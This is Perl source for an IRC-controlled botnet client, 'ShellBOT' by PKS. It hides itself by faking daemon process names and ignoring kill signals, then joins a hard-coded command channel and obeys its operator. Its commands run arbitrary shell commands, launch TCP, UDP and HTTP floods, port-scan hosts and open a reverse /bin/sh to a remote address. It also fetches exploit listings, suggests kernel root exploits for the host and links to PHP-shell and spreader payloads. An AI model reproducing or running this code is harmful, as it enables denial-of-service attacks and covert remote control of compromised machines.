#!/usr/bin/perl

# MODDED BY PKS

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use Socket;
use IO::Select;
use IO::Socket::INET;

##### FAKES #####

my @pss = (
    "/usr/local/apache/bin/httpd -DSSL", "/usr/sbin/sshd",
    "/usr/sbin/httpd",                   "[kswapd03]",
    "cupsd",                             "spamd child",
    "httpd",                             "[httpd]",
    "/usr/sbin/httpd -k start -DSSL"
);

my @nickk = (
    "Tys0n",    "berran",   "stuing",   "uncutter",  "readnot",  "gethelp",
    "curpos",   "cutext",   "detda",    "kanjo",     "neinei",   "fa3nda",
    "irriter",  "masa",     "jada",     "kanjeg",    "mutterz",  "dalenmin",
    "heimdal",  "korsett",  "de35nV",   "Gamblao",   "Deanz",    "Phreak",
    "Susa",     "Pils",     "Pilz",     "Bilz",      "Clubz",    "Clubs",
    "Clubbin",  "Fights",   "Kampen",   "Lier",      "Ils",      "Karss",
    "Gophy",    "reactor",  "fileporn", "filemp3",   "filelist", "free6",
    "purextc",  "drspeed",  "fuzzy",    "buzzz",     "GoScan",   "Vulned",
    "Gourl",    "cia",      "d3a",      "dea",       "nsa",      "nas",
    "asa",      "kma",      "makeconf", "sshdconf",  "d3nyall",  "vipz",
    "dualc0rz", "twoc0re",  "gotit",    "h0lyshit",  "prtls",    "rapt0r",
    "Vulnx",    "d3nyurl",  "vUlnurl",  "v0dka",     "Torshov",  "turboo",
    "Boost",    "fasty",    "fattys",   "eliter",    "vxbot",    "smufen",
    "datacore", "dual",     "dualcore", "Daniel",    "olso",     "dan",
    "spurv",    "byrds",    "jails",    "spoot",     "speels",   "comma",
    "julie",    "sveina",   "andre",    "andy",      "pulsedj",  "p0ker",
    "j0ker",    "eFn3t",    "lamaa",    "puman",     "Skeidar",  "Tinemelk",
    "Freia",    "Tresis",   "Tbanen",   "fr33b5d",   "h0lk3n",   "indexphp",
    "jooblaa",  "mamboo",   "Binl3n",   "Cplusplus", "p3rls3x",  "illgoon",
    "ill3gals", "c0lombia", "freeme",   "dupen",     "d3nmark",  "s2ed3n",
    "crypt0n",  "n0dam3n",  "Oslos",    "Scamurl"
);

my @identt = (
    "vx",      "mirc",   "iiris",  "bx",    "sun",   "info",
    "cpu",     "pet",    "pacs",   "dino",  "megov", "onet",
    "xrm",     "tisi",   "parm",   "cico",  "adio",  "audo",
    "soren",   "tvtree", "host3",  "unitd", "coda",  "cobra",
    "mans",    "gmail",  "email",  "null",  "mastr", "drunk",
    "full",    "beer",   "bayer",  "mage",  "neve",  "fist",
    "diadora", "dora",   "borris", "dev",   "cupra", "illegal",
    "Yuri",    "Geeez",  "Frys",   "pwned", "kung",  "kim",
    "lil",     "fatjoe", "fatman", "fat",   "joe",   "does",
    "quat",    "tres",   "dos",    "ono",   "tima",  "mytm",
    "motor",   "vsmot",  "sport",  "hs",    "fart",  "devs",
    "var",     "tmp",    "spol",   "jule",  "tree",  "two"
);

my @namee = (
    "Team Spirit",
    "Hello There",
    "Im just myself man",
    "Can u get the clue?",
    "Im not the only one",
    "Fear the lions",
    "Dragons back",
    "Turbo Quattro",
    "Sport Quattro",
    "aheh goofy",
    "Just for phun",
    "Thats my mofo name",
    "Snoooop Doggy Style...",
    "Tricky Trickey",
    "love, peace, and xeQt",
    "Clap your hands",
    "one two tree, bass",
    "lions",
    "Drugs, sex, and xtc",
    "i hate that biatch",
    "Go fuck yourself",
    "whois meeee",
    "Fatjoe Corp",
    "Brooklyn Bounche",
    "Dj Pulsedriver",
    "Random",
    "You have no clue",
    "This rocks",
    "uranium",
    "BinLaden",
    "Ted Bundy",
    "Charlie Cheeens",
    "Will Smith",
    "Freash Prince On IRC",
    "Freash prince in bel air",
    "Powered By PHPBB",
    "mambo",
    "dj pulse",
    "Powered By xeQt",
    "Delux",
    "2pac",
    "Biggie",
    "Fuck sadam",
    "Allah",
    "Im your god idiot",
    "Im to lame to read BitchX.doc",
    "Boika",
    "Diamonds",
    "Jean claude Van dame",
    "Arnold Schwartsneger",
    "Stig",
    "Anothony",
    "White Power",
    "Just do it",
    "vSmotor vs. Turbo",
    "Nismo Skyline GT-R R34",
    "Honda Civic Type-R",
    "Maria Carrey",
    "Terror Squad",
    "MySquad",
    "I'm to lame to read BitchX.doc",
    "w33d",
    "Crash Test Dummy",
    "Madonna",
    "Mtv",
    "vX power",
    "Team Windows",
    "Bill Gates",
    "Bill Gatez",
    "gBill",
    "Nokia, Connecting People...",
    "Thats my girl...",
    "BitchX",
    "smoke and fly",
    "dragons.."
);

################### [ CONFIGURAcION ] ###################

my $processo = $pss[ rand scalar @pss ];
my $nick     = $nickk[ rand scalar @nickk ];
my $ircname  = $identt[ rand scalar @identt ];
my $realname = $namee[ rand scalar @namee ];

my $linas_max = '5';
my $sleep     = '5';
my $VERSAO    = "ShellBOT whit RFISCAN by PKS Ver. 2.0";
my @servidor  = "v3nom.legitcrew.net";
$servidor = $servidor[ rand scalar @servidor ] unless $servidor;
my $porta  = '6667';
my @canais = ("###ddos");
my @adms   = ("V3nOm");

my @phpshell = 'http://www.freewebtown.com/mssn/x/sh.txt';
my @cmd      = 'http://www.freewebtown.com/mssn/x/cmd2.txt';
my @spread   = 'http://www.freewebtown.com/mssn/x/sp.txt';
my @bot      = 'http://www.freewebtown.com/mssn/x/bot.txt';

##########################################################

$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';
$SIG{'KILL'} = 'IGNORE';

##########################################################

chdir("/");
$servidor = "$ARGV[0]" if $ARGV[0];
$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);
print "Connectted to PKS BOT NET\n";

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();

sub sendraw {
    if ( $#_ == '1' ) {
        my $socket = $_[0];
        print $socket "$_[1]\n";
    }
    else {
        print $IRC_cur_socket "$_[0]\n";
    }
}

##########################################################

#######################################################
#                                                     #
#    SHELLBOT BY PKS - pks@cabrones.cl                #
#                                                     #
#######################################################

##########################################################

sub conectar {
    my $meunick      = $_[0];
    my $servidor_con = $_[1];
    my $porta_con    = $_[2];

    my $IRC_socket = IO::Socket::INET->new(
        Proto    => "tcp",
        PeerAddr => "$servidor_con",
        PeerPort => $porta_con
    ) or return (1);
    if ( defined($IRC_socket) ) {
        $IRC_cur_socket = $IRC_socket;

        $IRC_socket->autoflush(1);
        $sel_cliente->add($IRC_socket);

        $irc_servers{$IRC_cur_socket}{'host'}  = "$servidor_con";
        $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
        $irc_servers{$IRC_cur_socket}{'nick'}  = $meunick;
        $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
        nick("$meunick");
        sendraw("USER $ircname "
              . $IRC_socket->sockhost
              . " $servidor_con :$realname" );
        sleep 1;
    }
}
my $line_temp;
while (1) {
    while ( !( keys(%irc_servers) ) ) {
        conectar( "$nick", "$servidor", "$porta" );
    }
    delete( $irc_servers{''} ) if ( defined( $irc_servers{''} ) );
    my @ready = $sel_cliente->can_read(0);
    next unless (@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $meunick        = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread          = sysread( $fh, $msg, 4096 );
        if ( $nread == 0 ) {
            $sel_cliente->remove($fh);
            $fh->close;
            delete( $irc_servers{$fh} );
        }
        @lines = split( /\n/, $msg );

        for ( my $c = 0 ; $c <= $#lines ; $c++ ) {
            $line      = $lines[$c];
            $line      = $line_temp . $line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ( $c == $#lines ) {
                parse("$line");
            }
            else {
                if ( $#lines == 0 ) {
                    parse("$line");
                }
                elsif ( $lines[$c] =~ /\r$/ ) {
                    parse("$line");
                }
                elsif ( $line =~ /^(\S+) NOTICE AUTH :\*\*\*/ ) {
                    parse("$line");
                }
                else {
                    $line_temp = $line;
                }
            }
        }
    }
}

##########################################################

#######################################################
#                                                     #
#    SHELLBOT BY PKS - pks@cabrones.cl                #
#                                                     #
#######################################################

##########################################################

sub parse {
    my $servarg = shift;
    if ( $servarg =~ /^PING \:(.*)/ ) {
        sendraw("PONG :$1");
    }
    elsif ( $servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/ ) {
        my $pn       = $1;
        my $hostmask = $3;
        my $onde     = $4;
        my $args     = $5;
        if ( $args =~ /^\001VERSION\001$/ ) {
            notice( "$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001" );
        }
        if ( grep { $_ =~ /^\Q$pn\E$/i } @adms ) {
            if ( $onde eq "$meunick" ) {
                shell( "$pn", "$args" );
            }
            if ( $args =~ /^(\Q$meunick\E|\!x)\s+(.*)/ ) {
                my $natrix = $1;
                my $arg    = $2;
                if ( $arg =~ /^\!(.*)/ ) {
                    ircase( "$pn", "$onde", "$1" )
                      unless ( $natrix eq "!bot" and $arg =~ /^\!nick/ );
                }
                elsif ( $arg =~ /^\@(.*)/ ) {
                    $ondep = $onde;
                    $ondep = $pn if $onde eq $meunick;
                    bfunc( "$ondep", "$1" );
                }
                else {
                    shell( "$onde", "$arg" );
                }
            }
        }
    }
    elsif ( $servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i ) {
        if ( lc($1) eq lc($meunick) ) {
            $meunick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        }
    }
    elsif ( $servarg =~ m/^\:(.+?)\s+433/i ) {
        nick( "$meunick-" . int rand(999999) );
    }
    elsif ( $servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i ) {
        $meunick                              = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        foreach my $canal (@canais) {
            sendraw("JOIN $canal ddosit");
            sendraw("NOTICE @adms :You Are My Master");
        }
    }
}

##########################################################

#######################################################
#                                                     #
#    SHELLBOT BY PKS - pks@cabrones.cl                #
#                                                     #
#######################################################

##########################################################

sub bfunc {
    my $printl  = $_[0];
    my $funcarg = $_[1];
    if ( my $pid = fork ) {
        waitpid( $pid, 0 );
    }
    else {
        if (fork) {
            exit;
        }
        else {
            if ( $funcarg =~ /^nick (.*)/ ) {
                sendraw( $IRC_cur_socket, "NICK " . $1 );
                $nick = $1;
            }
            if ( $funcarg =~ /^join (.*)/ ) {
                sendraw( $IRC_cur_socket, "JOIN " . $1 );
            }
            if ( $funcarg =~ /^part (.*)/ ) {
                sendraw( $IRC_cur_socket, "PART " . $1 );
            }
            if ( $funcarg =~ /^msg\s+(\S+) (.*)/ ) {
                sendraw( $IRC_cur_socket, "PRIVMSG " . $1 . " :" . $2 );
            }
            if ( $funcarg =~ /^op (.*)/ ) {
                sendraw( $IRC_cur_socket, "MODE $printl +o " . $1 );
            }
            if ( $funcarg =~ /^deop (.*)/ ) {
                sendraw( $IRC_cur_socket, "MODE $printl -o " . $1 );
            }
            if ( $funcarg =~ /^voice (.*)/ ) {
                sendraw( $IRC_cur_socket, "MODE $printl +v " . $1 );
            }
            if ( $funcarg =~ /^die (.*)/ ) {
                sendraw( $IRC_cur_socket, "QUIT :" . $1 );
                $killd = "kill -9 " . fork;
                system(`$killd`);
            }
            if ( $funcarg =~ /^devoice (.*)/ ) {
                sendraw( $IRC_cur_socket, "MODE $printl -v " . $1 );
            }
            if ( $funcarg =~ /^say (.*)/ ) {
                sendraw( $IRC_cur_socket, "PRIVMSG $printl :" . $1 );
            }
            if ( $funcarg =~ /^reset(.*)/ ) {
                sendraw( $IRC_cur_socket, "QUIT :Di3 for my Master" );
            }
            if ( $funcarg =~ /^die(.*)/ ) {
                if ( $1 eq "" ) {
                    sendraw( $IRC_cur_socket, "QUIT :Di3 for my Master" );
                    $killd = "kill -9 " . fork;
                    system(`$killd`);
                }
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^fs (.*)/ ) {
                $urlfs =
"http://www.friendster.com/usersearch.php?search=1&country=ID&usearch="
                  . $1;
                $emailfs = $1;
                my $reqpx = HTTP::Request->new( GET => $urlfs );
                my $uarx = LWP::UserAgent->new();
                $uarx->timeout(10);
                my $responsefsfsfs = $uarx->request($reqpx);
                $pagefx = $responsefsfsfs->content;
                while ( $pagefx =~
                    m/View profile\" src=\"?http:\/\/([^>\"]+)\"?>/g )
                {
                    push( @lst_fs, $1 );
                    $cocokann = "@lst_fs";
                    if ( $cocokann eq
                        "images.friendster.com/images/nophoto.jpg" )
                    {
                        sendraw( $IRC_cur_socket,
                            "PRIVMSG $printl :ga duwe foto iks,..." );
                    }
                    else {
                        sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\x3\x34\x2C\x31\x40\x3\x39\x7D\x3\x33\x2D\x3\x39\x2C\x3\x33\x2D\x20\x2\x3\x31\x31\x2C\x31@adms\x2\x3\x30\x2C\x31, gw dapetin tu fotonya si \x3\x34$emailfs\x3\x30\x2C\x31 : \x3\x33[http://@lst_fs] \x3\x31\x34\x2C\x31ndang wes di gendak!!!\x2D\x3\x39\x27\x3\x33\x2D\x3\x39\x7B\x3\x34\x40\xF\xF\xF"
                        );
                    }
                }
                if ( $cocokann eq "" ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\x3\x35\x2C\x31\x7E\x5F\x7E\x21\x20\x2\x3\x31\x31\x2C\x31@adms\x2\x3\x30\x2C\x31, gw ga nemuin tuh fs nya \x3\x34$emailfs\xF\x3\x30\x2C\x31 kamu di boong'in kale bro!! \x3\x35\x2C\x31\x7E\x5F\x7E\x21\xF"
                    );
                }
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^tsunami\s+(\d+)\s+(.*)/ ) {
                for ( my $dx = 0 ; $dx <= $1 ; $dx++ ) {
                    my @nickxxxx =
                      ( "s", "p", "a", "m", "l", "o", "a", "S", "[", "]" );
                    $nickfgv =
                        $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ]
                      . $nickxxxx[ rand scalar @nickxxxx ];
                    $msgflood =
                        $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv
                      . $nickfgv;
                    $msgflood = $msgflood . $msgflood;
                    $msgflood = $msgflood . $msgflood;
                    sendraw( $IRC_cur_socket, "NICK " . $nickfgv );
                    sleep 10;
                    sendraw( $IRC_cur_socket,
                        "PRIVMSG " . $2 . " :" . $msgflood );
                    sleep 2;
                    sendraw( $IRC_cur_socket,
                        "NOTICE " . $2 . " :" . $msgflood );
                }
                sendraw( $IRC_cur_socket, "NICK " . $nick );
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^help(.*)/ ) {
                if ( $printl eq "@adms" ) {
                    $msghelp = "PRIVMSG @adms";
                }
                else {
                    $msghelp = "NOTICE @canais";
                }
                sendraw( $IRC_cur_socket,
                    $msghelp . " :\002\0034[help]\003\002 Command LIsT." );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :Derechos Reservados (C) 2007" );
                sendraw( $IRC_cur_socket,
                        $msghelp
                      . " :Corriendo con botperl ["
                      . $realname
                      . " Version:"
                      . $VERSAO
                      . "] LoaDED bY PKS" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp
                      . " :\002\0034<------------------------------------------------>\003\002"
                );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@help" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@scan <tiempo> <vul> <dork>" );
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@portscan <IP/domain Name>" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@udpflood <IP> <packet-size> <time>" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@tcpflood <IP> <port> <time>" );
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@udpflood <IP> <packet-size> <time>" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@httpflood <www.website.com> <time>" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@say <msg>" );
                sleep 2;
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@join <#>" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@part <#>" );
                sleep 2;
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@nick <nick>" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@msg <#/nick>" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :!x \@tsunami <Tiempo> <#/nick> <msg>" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@op <nick>" );
                sleep 2;
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@deop <nick>" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@voice <nick>" );
                sleep 2;
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@devoice <nick>" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@fs <email>" );
                sleep 2;
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@reset" );
                sendraw( $IRC_cur_socket, $msghelp . " :!x \@die <msg>" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp . " :" . $nick . " \@back <ip> <port>" );
                sendraw( $IRC_cur_socket,
                    $msghelp . " :" . $nick . " \@<comando> <-- comando solo" );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    $msghelp
                      . " :\002\0034<------------------------------------------------>\003\002"
                );
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^portscan (.*)/ ) {
                my $hostip = "$1";
                my @portas = (
                    "15",    "19",    "98",    "20",    "21",    "22",
                    "23",    "25",    "37",    "39",    "42",    "43",
                    "49",    "53",    "63",    "69",    "79",    "80",
                    "101",   "106",   "107",   "109",   "110",   "111",
                    "113",   "115",   "117",   "119",   "135",   "137",
                    "139",   "143",   "174",   "194",   "389",   "389",
                    "427",   "443",   "444",   "445",   "464",   "488",
                    "512",   "513",   "514",   "520",   "540",   "546",
                    "548",   "565",   "609",   "631",   "636",   "694",
                    "749",   "750",   "767",   "774",   "783",   "808",
                    "902",   "988",   "993",   "994",   "995",   "1005",
                    "1025",  "1033",  "1066",  "1079",  "1080",  "1109",
                    "1433",  "1434",  "1512",  "2049",  "2105",  "2432",
                    "2583",  "3128",  "3306",  "4321",  "5000",  "5222",
                    "5223",  "5269",  "5555",  "6660",  "6661",  "6662",
                    "6663",  "6665",  "6666",  "6667",  "6668",  "6669",
                    "7000",  "7001",  "7741",  "8000",  "8018",  "8080",
                    "8200",  "10000", "19150", "27374", "31310", "33133",
                    "33733", "55555"
                );
                my ( @aberta, %porta_banner );
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :\002\0034[SCAN]\003\002 Escaneando "
                      . $1
                      . " por puertos abiertos." );
                foreach my $porta (@portas) {
                    my $scansock = IO::Socket::INET->new(
                        PeerAddr => $hostip,
                        PeerPort => $porta,
                        Proto    => 'tcp',
                        Timeout  => 4
                    );
                    if ($scansock) {
                        push( @aberta, $porta );
                        $scansock->close;
                    }
                }

                if (@aberta) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002\0034[SCAN]\003\002 Puertos Abiertos(s): @aberta"
                    );
                }
                else {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002\0034[SCAN]\003\002 Sin puertos Abiertos"
                    );
                }
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^sysinfo/ ) {
                $uname  = `uname -a`;
                $uptime = `uptime`;
                $ownd   = `pwd`;
                $distro = `cat /etc/issue`;
                $id     = `id`;
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Info del BOT : 7 Servidor :Hiden : 6667"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Uname -a     : 7 $uname"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Uptime       : 7$uptime"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Own Prosses  : 7 $processo"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12ID           : 7 $id"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Own Dir      : 7 $ownd"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Distro       : 7 $distro"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Owner        : 7 PKS"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Sys-Info12) 12Version      : 7 1.0"
                );
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^hello/ ) {
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :15(7@4PKsheLLO15) - 7@4Hi My bOOS, iM Ready To WoRK"
                );
            }

            if ( $funcarg =~ /^urls/ ) {
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :15(7@4PKsInFO15) - 7@4PHPSHELL: @phpshell"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :15(7@4PKsInFO15) - 7@4CMD     : @cmd"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :15(7@4PKsInFO15) - 7@4SPREADER: @spread"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :15(7@4PKsInFO15) - 7@4BOT     : @bot"
                );

            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/ ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :\002\0034[TCP DDoSing]\003\002 Atacando "
                      . $1 . ":"
                      . $2 . " por "
                      . $3
                      . " segundos." );
                my $itime = time;
                my ($cur_time);
                $cur_time = time - $itime;
                while ( $3 > $cur_time ) {
                    $cur_time = time - $itime;
                    &tcpflooder( "$1", "$2", "$3" );
                }
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002\0034[TCP DDoSing]\003\002 Ataque terminado "
                      . $1 . ":"
                      . $2
                      . "." );
            }
            if ( $funcarg =~ /^version/ ) {
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :\002\0034[VERSION]\003\002 mIRC32 "
                      . $VERSAO
                      . " K.Mardam-Bey" );
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^back\s+(.*)\s+(\d+)/ ) {
                my $host  = "$1";
                my $porta = "$2";
                my $proto = getprotobyname('tcp');
                my $iaddr = inet_aton($host);
                my $paddr = sockaddr_in( $porta, $iaddr );
                my $shell = "/bin/sh -i";
                if ( $^O eq "MSWin32" ) {
                    $shell = "cmd.exe";
                }
                socket( SOCKET, PF_INET, SOCK_STREAM, $proto )
                  or die "socket: $!";
                connect( SOCKET, $paddr ) or die "connect: $!";
                open( STDIN,  ">&SOCKET" );
                open( STDOUT, ">&SOCKET" );
                open( STDERR, ">&SOCKET" );
                system("$shell");
                close(STDIN);
                close(STDOUT);
                close(STDERR);

                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002\0034[BackConnect]\003\002: Conectando con $host:$porta"
                );

            }

            if ( $funcarg =~ /^proxy (.*)/ ) {
                my @type  = $1;
                my @ttt   = ();
                my @ttt1  = ();
                my @ttt2  = ();
                my @ttt3  = ();
                my $sock2 = IO::Socket::INET->new(
                    PeerAddr => "publicproxyservers.com ",
                    PeerPort => "80",
                    Proto    => "tcp"
                ) or return;
                print $sock2
"GET http://www.publicproxyservers.com/page1.html HTTP/1.0\r\nHost: publicproxyservers.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
                my @r = <$sock2>;
                $page = "@r";
                close($sock2);

                while ( $page =~ m/<td align=\"left\" height=17(.*)<\/td>/g ) {
                    push( @ttt, $1 );
                }
                while ( $page =~ m/<td>([A-Z].*)<\/td>/g ) {
                    push( @ttt1, $1 );
                }
                while ( $page =~ m/<td height=17>(.*)<\/td>/g ) {
                    push( @ttt2, $1 );
                }
                while ( $page =~
                    m/<td>(anonymous|transparent|high anonymity)<\/td>/g )
                {
                    push( @ttt3, $1 );
                }
                foreach $x ( 0 .. ( @ttt - 1 ) ) {
                    if ( $ttt3[$x] =~ /@type/ ) {
                        sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Proxy12) 7$ttt[$x] - $ttt1[$x] - $ttt2[$x] - $ttt3[$x]"
                        );
                        sleep 2;
                    }
                }
            }

            if ( $funcarg =~ /^proxychk (.*)/ ) {
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7 7Proxy Check12) 7http://publicproxyservers.com/cgi-bin/whois.cgi?domain=$1"
                );
            }
            if ( $funcarg =~ /^mw (.*)/ ) {
                $search = $1;
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7MillW0rm12) 7MillW0rm Searcher"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7MillW0rm12) 7URL: 12http://milw0rm.com/search.php?dong=$search&Submit=Submit"
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7MillW0rm12) 7Latest Exploit's: 12http://milw0rm.com/rss.php"
                );
            }

            if ( $funcarg =~ /^mwlast$/ ) {
                my @ltt = ();
                my @bug = ();
                my $x;
                my $page  = "";
                my $socke = IO::Socket::INET->new(
                    PeerAddr => "milw0rm.com",
                    PeerPort => "80",
                    Proto    => "tcp"
                ) or return;
                print $socke
"GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
                my @r = <$socke>;
                $page = "@r";
                close($socke);

                while ( $page =~ m/<title>(.*)</g ) {
                    $x = $1;
                    if ( $x =~ /\&lt\;/ ) {
                        $x =~ s/\&lt\;/</g;
                    }
                    if ( $x !~ /milw0rm/ ) {
                        push( @bug, $x );
                    }
                }
                while ( $page =~ m/<link.*expl.*([0-9]...)</g ) {
                    if ( $1 !~ m/milw0rm.com|exploits|en/ ) {
                        push( @ltt, "http://www.milw0rm.com/exploits/$1 " );
                    }
                }
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7MillW0rm12) 7MillW0rm Last Bugs"
                );
                foreach $x ( 0 .. ( @ltt - 1 ) ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7MillW0rm12) 7$bug[$x] - $ltt[$x]"
                    );
                    sleep 1;
                }
            }

            if ( $funcarg =~ /^root(.*)/ ) {
                if ( `uname -a` =~ /2.4.17/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 newlocal, kmod"
                    );
                }
                if ( `uname -a` =~ /2.4.1[89]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 brk, brk2, newlocal, kmod, km.2"
                    );
                }
                if ( `uname -a` =~ /2.4.2[0]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 ptrace, kmod, ptrace-kmod, km.2, brk, brk2"
                    );
                }
                if ( `uname -a` =~ /2.4.22-10/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 loginx"
                    );
                }
                if ( `uname -a` =~ /2.4.2[12]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 km.2, brk, brk2, ptrace, ptrace-kmod"
                    );
                }
                if ( `uname -a` =~ /2.4.2[3]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 mremap_pte"
                    );
                }
                if ( `uname -a` =~ /2.4.2[4]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 mremap_pte, Uselib24"
                    );
                }
